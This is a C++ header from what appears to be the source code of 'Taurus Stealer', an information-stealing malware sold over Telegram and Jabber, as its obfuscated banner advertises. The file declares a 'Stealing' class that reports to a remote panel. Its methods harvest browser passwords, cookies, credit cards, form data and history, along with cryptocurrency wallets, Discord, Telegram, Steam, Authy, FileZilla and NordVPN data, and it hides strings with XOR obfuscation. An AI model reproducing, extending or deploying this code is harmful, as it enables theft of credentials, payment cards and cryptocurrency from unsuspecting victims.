#define VERSION XorStr("  ______                               _____ __             __         \r\n /_  __/___ ___  _________  _______   / ___// /____  ____ _/ /__  _____\r\n  / / / __ `/ / / / ___/ / / / ___/   \\__ \\/ __/ _ \\/ __ `/ / _ \\/ ___/\r\n / / / /_/ / /_/ / /  / /_/ (__  )   ___/ / /_/  __/ /_/ / /  __/ /    \r\n/_/  \\__,_/\\__,_/_/   \\__,_/____/   /____/\\__/\\___/\\__,_/_/\\___/_/     \r\n_____________________________________________________________________________\r\n|Buy at Telegram: t.me/taurus_seller |Buy at Jabber: taurus_seller@exploit.im|\r\n``````````````````````````````````````````````````````````````````````````````\r\n")
#define BOOL_STR(x) (x[0] == '1' ? true : false)
#define STR_BOOL(b) (b ? '1' : '0')

struct PassData
{
	string Soft = string();
	string Host = string();
	string Login = string();
	string Pass = string();
	string Path = string();
};

struct GrabData 
{
	bool bGrabbed = false;
	string LastPath = string();
	size_t Index = 0;
};

struct Wallets
{
	GrabData Electrum;
	GrabData MultiBit;
	GrabData Armory;
	GrabData Ethereum;
	GrabData Bytecoin;
	GrabData Jaxx;
	GrabData LibertyJaxx;
	GrabData Atomic;
	GrabData Exodus;
	GrabData DashCore;
	GrabData Bitcoin;
	GrabData Wasabi;
	GrabData Daedalus;
	GrabData Monero;
};

struct JabberClients 
{
	GrabData Pidgin;
	GrabData Psi;
	GrabData PsiPlus;
};

struct GrabbedInfo 
{
	bool bChromium = false;
	bool bGecko = false;
	bool bEdge = false;
	Wallets GrabbedWallets;
	GrabData Steam;
	GrabData Telegram;
	GrabData Discord;
	JabberClients Jabber;
	bool bFoxmail = false;
	bool bOutlook = false;
	GrabData FileZilla;
	bool bWinScp = false;
	GrabData Authy;
	GrabData NordVpn;
};

struct Data
{
	string path = string();
	string output = string();
};

class Stealing
{
private:
	string panelLink;
	DWORD port;
	string uid;
	string osVer;
	string prefix;

	Data pass, form, card;
	string logInfoFile;
	string cookiePath;
	string workingPath;
	string temp_db_path;
	string walletOutput;
	string historyDir;
	string user_agent;
	string archiveBytes;
	string jabberPath;
	string fileZillaPath;
	string installedSoftFile;
	string discordPath;
	string authyPath;
	string steamPath;
	string telegramPath;

	size_t cookieIndex = 0, historyIndex = 0, screenshotIndex = 0;

	const string define_browser(string path);

	void GrabWalletIsExist(GrabData* data, string currentPath, string walletName, string mask);
	void GetWallets(string currentPath, size_t i);

	void GetJabber(string currentPath, size_t i);
	void GetFileZilla(string currentPath);
	void GetDiscord(string currentPath);
	void GetAuthy(string currentPath);
	void GetSteam(string currentPath);
	void GetTelegram(string currentPath);
	void IsPathNeeded(string currentPath);

	void GetChromiumPasswords(string path);
	void GetChromiumCards(string path);
	void GetChromiumForms(string path);
	void GetChromiumCookies(string path);
	void GetChromiumHistory(string path);

	void GetFormsGecko(string path);
	void GetCookiesGecko(string path);
	void GetPasswordsGecko(string path);
	void GetHistoryGecko(string path);
	void GetBrowsers(string currentPath, size_t i);
	void GetNordVpn(string currentPath);
	void IsFileNeeded(string currentPath);
public:
	Stealing(string panelLink, DWORD panelPort, string uid, string osVer, string prefix)
	{
		this->panelLink = panelLink;
		this->port = panelPort;
		this->uid = uid;
		this->osVer = osVer;
		this->prefix = prefix;
		this->panel = Panel(this->panelLink, this->port, this->uid);

		this->pass.path = XorStr("General\\passwords.txt");
		this->cookiePath = XorStr("Cookies");
		this->form.path = XorStr("General\\forms.txt");
		this->card.path = XorStr("General\\cards.txt");
		this->historyDir = XorStr("History");
		this->walletOutput = XorStr("Wallets");
		this->logInfoFile = XorStr("LogInfo.txt");
		this->jabberPath = XorStr("Jabber");
		this->fileZillaPath = XorStr("FileZilla");
		this->installedSoftFile = XorStr("Installed Software.txt");
		this->discordPath = XorStr("Discord");
		this->authyPath = XorStr("Authy");
		this->steamPath = XorStr("Steam");
		this->telegramPath = XorStr("Telegram");
	}

	Panel panel;;
	Config config;
	GrabbedInfo grabbedInfo;

	size_t passwords = 0, cards = 0, forms = 0, cookies = 0;
	
	vector<string> cookieList;
	vector<string> passw_domains;

	void SetWorkingPath();
	void AddPass(string soft, string, string login, string pass, string path);
	void AddPass(PassData data);
	bool CheckPath(string& path, UINT needHash);
	size_t CheckPathsArray(string currentPath, UINT* pathsArray, size_t pathsCount);
	void MainRec(string path);
	void GetEdgePasswords();
	void NetscapeCookie(string cookie_path, string& output);
	void ProcessCookies(string path, string& output);
	void GetEdgeCookies();
	void BuildLogInfo();
	void CleanUp(string url);
	bool IsCryptoExist();
};